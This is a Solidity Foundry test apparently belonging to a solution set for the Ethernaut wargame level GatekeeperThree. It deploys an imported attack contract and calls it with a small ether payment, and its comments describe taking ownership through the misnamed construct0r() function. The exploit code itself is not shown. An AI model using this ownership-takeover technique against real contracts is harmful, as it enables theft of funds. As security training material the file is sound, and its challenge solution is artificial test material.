// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/28-GatekeeperThree/GatekeeperThreeFactory.sol";
import "src/levels/28-GatekeeperThree/AttackGatekeeperThree.sol";

contract GatekeeperThreeTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = tx.origin;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(hacker, 0.0011 ether);
    }

    function testGatekeeperThreeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        GatekeeperThreeFactory gatekeeperThreeFactory = new GatekeeperThreeFactory();
        ethernaut.registerLevel(gatekeeperThreeFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(
            gatekeeperThreeFactory
        );
        GatekeeperThree ethernautGatekeeperThree = GatekeeperThree(
            payable(levelAddress)
        );

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // 1. Attacker creates `AttackGatekeeperThree` contract providing the address of the `GatekeeperThree` contract.
        AttackGatekeeperThree attackGatekeeperThree = new AttackGatekeeperThree(
            address(ethernautGatekeeperThree)
        );

        emit log_named_address(
            "Address of entrant before attack: ",
            address(ethernautGatekeeperThree.entrant())
        );

        // 2. Attacker calls the `attack()` function in the `AttackGatekeeperThree` contract that is invoking `construct0r()` on `GatekeeperThree` contract making him the owner of the `GatekeeperThree` contract.
        attackGatekeeperThree.attack{value: 0.0011 ether}();

        emit log_named_address(
            "Address of entrant after attack: ",
            address(ethernautGatekeeperThree.entrant())
        );

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
